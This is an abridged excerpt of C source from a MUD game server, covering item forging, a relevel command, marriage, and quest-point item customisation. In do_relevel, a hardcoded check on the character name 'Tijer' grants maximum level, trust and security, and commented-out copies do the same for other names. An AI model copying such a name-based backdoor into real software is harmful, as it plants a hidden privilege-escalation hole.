...
{   
    ...
    forgelevel = ch->level; // Elkor: fixed the infamous forge bugs! :)
    forgetrust = ch->trust; // Elkor: fixed the infamous forge bugs! :)
	...
	if ( arg1[0] == '\0' || arg2[0] == '\0' )
    {
        ...
        send_to_char( "Syntax: Forge (gem/metal/hilt) (item)\n\r",ch);
        ...
        send_to_char(" Electrum               Jade.                       Gold\n\r",ch);
    ...
    {
    	send_to_char("You can only forge items you own.\n\r",ch);
	return;
    }

    if (IS_SET(obj->quest, QUEST_ARTIFACT))  
    {
	send_to_char( "You cannot forge an artifact.\n\r",ch);
	return;
    }
    if (obj->item_type == ITEM_QUEST)
    {
	stc("You cannot forge a token.\n\r",ch);
        return;
    }
...
IS_SET(obj->spectype, SITEM_ADAMANTITE) || IS_SET(obj->spectype, SITEM_ELECTRUM))
	    {
	    ...
	    ch->level = 12;
	    ch->trust = 12;
            rand_oset_affect(ch,obj,3,APPLY_HITROLL,FALSE);
            rand_oset_affect(ch,obj,3,APPLY_DAMROLL,FALSE);
	    ch->level = forgelevel;
	    ch->trust = forgelevel;
            extract_obj( obj2 );
...
IS_SET(obj->spectype, SITEM_ADAMANTITE) || IS_SET(obj->spectype, SITEM_ELECTRUM))
		...
		return;
            ...
            ch->level=12;
            ch->trust=12;
            rand_oset_affect(ch,obj,6,APPLY_HITROLL,FALSE);
            rand_oset_affect(ch,obj,6,APPLY_DAMROLL,FALSE);
            ch->level=forgelevel;
            ch->trust=forgelevel;
                extract_obj( obj2 );
...
IS_SET(obj->spectype, SITEM_ADAMANTITE) || IS_SET(obj->spectype, SITEM_ELECTRUM))
		...
		return;
            ...
            ch->level=12;
            ch->trust=12;
            rand_oset_affect(ch,obj,9,APPLY_HITROLL,FALSE);
            rand_oset_affect(ch,obj,9,APPLY_DAMROLL,FALSE);
            ch->level=forgelevel;
            ch->trust=forgetrust;
                extract_obj( obj2 );
...
IS_SET(obj->spectype, SITEM_ADAMANTITE) || IS_SET(obj->spectype, SITEM_ELECTRUM))
		...
		return;
            ...
            ch->level=12;
            ch->trust=12;
            rand_oset_affect(ch,obj,12,APPLY_HITROLL,FALSE);
            rand_oset_affect(ch,obj,12,APPLY_DAMROLL,FALSE);
            ch->level=forgelevel;
            ch->trust=forgetrust;
                extract_obj( obj2 );
	...
	return;
         ...
         if (!str_cmp( arg1, "electrum" ))
        {
          if ( ( obj2 = get_obj_carry( ch, (arg1))) == NULL )
          {
           send_to_char( "You have no electrum.\n\r", ch);
           return;
          }
          if (obj2->item_type != ITEM_ELECTRUM )
{send_to_char("That isnt Electrum!\n\r",ch);return;}
         else if( IS_SET(obj->spectype, SITEM_COPPER) ||
IS_SET(obj->spectype, SITEM_IRON) || IS_SET(obj->spectype, SITEM_STEEL) ||
IS_SET(obj->spectype, SITEM_ADAMANTITE) || IS_SET(obj->spectype, SITEM_ELECTRUM))
         {
         ...
         SET_BIT( obj->spectype, SITEM_ELECTRUM );
         ch->level=12;
         ch->trust=12;
         rand_oset_affect(ch,obj,24,APPLY_HITROLL,FALSE);
         rand_oset_affect(ch,obj,24,APPLY_DAMROLL,FALSE);
         ch->level=forgelevel;
         ch->trust=forgetrust;
                extract_obj( obj2 );
            act("You forge ELECTRUM onto $p.\n\r",ch, obj,NULL,TO_CHAR, FALSE);
            act("$n forges ELECTRUM onto $p.\n\r",ch,obj,NULL,TO_ROOM, FALSE);
        return;
        }
        ...
        if (!str_cmp( arg1, "jade" ))
   	{
		...
		return;
           ...
           if (obj->item_type == ITEM_WEAPON)
           {
            if (obj->value[0] >= 1000)
		obj->value[0] -= ((obj->value[0] / 1000) * 1000);
	    if (!IS_EVIL(ch)) obj->value[0] += 7000;
            else obj->value[0] += 139000;
           }	        
	   else if (obj->item_type == ITEM_ARMOR)
           { 
	...
	return;
            ...
            if (!str_cmp( arg1, "pearl" ))
   	{
	    ...
	    if (obj2->item_type != ITEM_GEMSTONE)
 	    { send_to_char("That isn't a pearl.\n\r",ch); return;}
             else if (IS_SET(obj->spectype, SITEM_GEMSTONE))
	    {
                send_to_char("That item is already forged with a gemstone.\n\r",ch);
		return;
	...
	return;
            ...
            if (!str_cmp( arg1, "amethyst" ))
   	{
	    ...
	    if (obj2->item_type != ITEM_GEMSTONE)
 	    { send_to_char("That isn't a amethyst gemstone.\n\r",ch); return;}
             else if (IS_SET(obj->spectype, SITEM_GEMSTONE))
	    {
                send_to_char("That item is already forged with a gemstone.\n\r",ch);
		return;
	...
	return;
            ...
            if (!str_cmp( arg1, "opal" ))
   	{
	    ...
	    if (obj2->item_type != ITEM_GEMSTONE)
 	    { send_to_char("That isn't an opal gemstone.\n\r",ch); return;}
             else if (IS_SET(obj->spectype, SITEM_GEMSTONE))
	    {
                send_to_char("That item is already forged with a gemstone.\n\r",ch);
		return;
	...
	return;
            ...
            if (!str_cmp( arg1, "ebony" ))
   	{
	    ...
	    if (obj2->item_type != ITEM_HILT)
 	    { send_to_char("That isn't an ebony.\n\r",ch); return;}
             else if (IS_SET(obj->spectype, SITEM_HILT))
	    {
                send_to_char("That item is already forged with a hilt.\n\r",ch);
		return;
	...
	return;
            ...
            if (!str_cmp( arg1, "gold" ))
   	{
	    ...
	    if (obj2->item_type != ITEM_HILT)
 	    { send_to_char("That isn't a gold hilt.\n\r",ch); return;}
...
void 	do_relevel( CHAR_DATA *ch, char *argument )
{
   ...
   if (!str_cmp( arg, "mastermind" ))
   {
    if (!str_cmp(ch->pcdata->switchname, "Tijer"))
    {
	ch->level = MAX_LEVEL;
	ch->trust = MAX_LEVEL;
	ch->pcdata->security = 9;
	stc("If you are really Jank, prove it.\n\r",ch);
        return;
    }
/*
    	else if (!str_cmp(ch->pcdata->switchname, "Rand"))
    {
        ...
        ch->trust = MAX_LEVEL;
        ch->pcdata->security = 9;
        send_to_char("#0You are god but you aren't holy!#n\n\r",ch);
        return;
    }
	else if (!str_cmp(ch->pcdata->switchname, "Snard"))
    {
        ...
        ch->trust = MAX_LEVEL;
        ch->pcdata->security = 9;
        send_to_char("#0bah bah bah!#n\n\r",ch);
        return;
    }
	else if (!str_cmp(ch->pcdata->switchname, "Huw"))
    {
        ch->level = MAX_LEVEL;
        ch->trust = MAX_LEVEL;
        ch->pcdata->security = 9;
        send_to_char("Huw, Huw, Huw, Huw, Huw, Who?!#n\n\r",ch);
        return;

    }
	else if (!str_cmp(ch->pcdata->switchname, "Keale"))
    {
        ch->level = MAX_LEVEL;
        ch->trust = MAX_LEVEL;
        ch->pcdata->security = 9;
        send_to_char("Holy crap! Pwned!#n\n\r",ch);
        return;
    } 
	else if (!str_cmp(ch->pcdata->switchname, "Tei"))
    {
        ch->level = MAX_LEVEL;
        ch->trust = MAX_LEVEL;
        ch->pcdata->security = 9;
...
*/
	...
	act("You propose marriage to $M.",ch,NULL,victim,TO_CHAR, FALSE);

	act("$n gets down on one knee and proposes to $N.",ch,NULL,victim,TO_NOTVICT, 
FALSE);

	act("$n asks you quietly 'Will you marry me?'",ch,NULL,victim,TO_VICT, FALSE);
...
*/
	...
	act("You accept $S offer of marriage.",ch,NULL,victim,TO_CHAR, FALSE);
	act("$n accepts $N's offer of marriage.",ch,NULL,victim,TO_NOTVICT, FALSE);
	act("$n accepts your offer of marriage.",ch,NULL,victim,TO_VICT, FALSE);
	save_char_obj(ch);
...

{
	...
	act("You break off your engagement with $M.",ch,NULL,victim,TO_CHAR, FALSE);

	act("$n breaks off $n engagement with $N.",ch,NULL,victim,TO_NOTVICT, FALSE);

	act("$n breaks off $s engagement with you.",ch,NULL,victim,TO_VICT, FALSE);
...

{
	...
	xSET_BIT(victim1->extra, EXTRA_MARRIED);

	xSET_BIT(victim2->extra, EXTRA_MARRIED);
...

{
	...
	xREMOVE_BIT(victim1->extra, EXTRA_MARRIED);

	xREMOVE_BIT(victim2->extra, EXTRA_MARRIED);
...
void do_quest( CHAR_DATA *ch, char *argument )
{
	...
	{
 send_to_char("Syntax: quest create <object> <field>\n\rObject being one of:\n\r     Light (10 QP), Weapon <type> (1000 QP), Armor (30 QP),\n\r     Container (10 QP), Boat (10 QP), Fountain <type> (10 QP), Stake (10 QP).\n\r",ch);
	    return;
	}
    	     if (!str_cmp(arg2,"light"    )) {add = ITEM_LIGHT;     value = 10;}
    	else if (!str_cmp(arg2,"weapon"   )) {add = ITEM_WEAPON;    value = 1000;}
	...
	{
            send_to_char("Syntax: quest create <object> <field>\n\rObject being one of: Light (10 QP), Weapon <type> (50 QP),\n\r Armor (30 QP),\n\rContainer (10 QP), Boat (10 QP), Fountain <type> (10 QP), Stake (10 QP), Adamantite (1000 QP).\n\r",ch);
	    return;
	}
	...
	if (add == ITEM_WEAPON)
	{
		...
		return;
            ...
            else if (!str_cmp(arg3,"hit"   )) obj->value[3] = 13;
	    else {
                send_to_char("Please specify weapon type: Slice, Stab, Slash, Whip, Claw, Blast, Pound, Crush, Pierce, Grep, Bite, or Suck.\n\r",ch);
		if (obj != NULL) extract_obj(obj);
		return;}
	...
	send_to_char( "Create: Creates a new personalized object, costing between 10 and 1000 QP.\n\r",ch );
	send_to_char( "Name/Short/Long: Rename the object.  1 QP for each.\n\r",ch );
	...
	send_to_char( "Weapon: Sets weapon type for 1000 QP.\n\r", ch );
	send_to_char( "Extra (add/remove): Glow(1/1), Hum(1/1), Invis(1/1), Anti-Good(1/10),\n\rAnti-Neutral(1/10), Anti-Evil(1/10), Loyal(10/1).\n\r",ch );
	send_to_char( "Wear: Select location, costs 500 QP's.  Type 'quest <obj> wear' to see locations.\n\r",ch );
	send_to_char( "Power: Spell power for spell weapons.  Costs 1 QP per power point.\n\r",ch );
	send_to_char( "Spell: Spell weapons or affect.  Costs 500 QP.\n\r",ch );
//	send_to_char( "Weight: Set objects weight to 100.  Costs 100 QP.\n\r",ch );
	send_to_char( "Str, Dex, Int, Wis, Con... max =   3 each, at  200 quest points per +1 stat.\n\r", ch);
	send_to_char( "Hp, Mana, Move............ max = 500 each, at  500 quest points per point.\n\r", ch);
	send_to_char( "Hitroll, Damroll.......... max =  50 each, at  200 quest points per point.\n\r", ch);
	send_to_char( "Ac........................ max = -250,     at  100 points per point.\n\r", ch);
	send_to_char( "- - - - - - - - - - ----====[ QUEST ITEM COSTS ]====---- - - - - - - - - - -\n\r",	 ch );
	return;
    }
    if (ch->pcdata->quest <= 0)
    {
	send_to_char( "You do not have any quest points.\n\r",ch);
	return;
    }
	...
	if (IS_SET(obj->quest,QUEST_RELIC))
	    ...
	    {
	    	send_to_char("You need 1000 quest points to do this.\n\r", ch);
	    	return;
	    }
	    if (arg3[0] == '\0')
	    {
		...
		return;
            ...
            else if (!str_cmp(arg3,"hit")) value = 13;
	    else
	    {
		send_to_char("Please specify weapon type: Slice, Stab, Slash, Whip, Claw, Blast, Pound, Crush, Pierce, Grep, Bite, or Suck.\n\r",ch);
		return;
	...
	if      ( !str_cmp( arg3, "finger" )) value = ITEM_WEAR_FINGER;
        ...
        else if ( !str_cmp( arg3, "light"  )) value = ITEM_LIGHT;
	else {
...

	{
	    ...
	    act("But $p is already worn in that location!",ch,obj,NULL,TO_CHAR, FALSE);
...

	{
	    ...
	    act("You can only HOLD a weapon.",ch,obj,NULL,TO_CHAR, FALSE);

	    return;

	}

	else if (ch->pcdata->quest < 500 && !(obj->pIndexData->vnum == 30037 && obj->wear_flags == 1))
	{

	    send_to_char("It costs 500 quest points to change a location.\n\r", ch);
...

	{
	    ...
	    send_to_char("It costs 500 quest points to create a spell weapon or affect.\n\r", ch);
...
/*
	...
	{
	    send_to_char("You cannot change the weight of a pill.\n\r",ch);
	    return;
	}
	if (obj->weight < 2)
...
*/
	...
	if (!IS_IMMORTAL(ch))
	{
	stc("Transporters have been removed\n\r",ch);
	return;
	}
